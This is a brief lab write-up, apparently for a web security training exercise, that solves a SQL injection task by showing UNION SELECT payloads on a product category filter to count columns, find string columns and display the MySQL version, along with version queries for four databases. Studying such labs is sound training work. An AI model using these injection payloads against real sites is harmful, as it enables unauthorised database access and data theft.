## End Goal :  To solve the lab, display the database version string. 

## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

|   |   |
|---|---|
|Oracle|`SELECT banner FROM v$version   SELECT version FROM v$instance   `|
|Microsoft|`SELECT @@version`|
|PostgreSQL|`SELECT version()`|
|MySQL|`SELECT @@version`|

GET /filter?category=Pets HTTP/2

## Finding the number column:

`Pets ' Union select null, null #`
for mysql comment is # not --

here number of column = 2


## finding column of string data type

`Pets ' Union select 'a', 'a' #`

Both column are of string data type

## solving the end goal

`pets ' union select @@version , 'a' #`
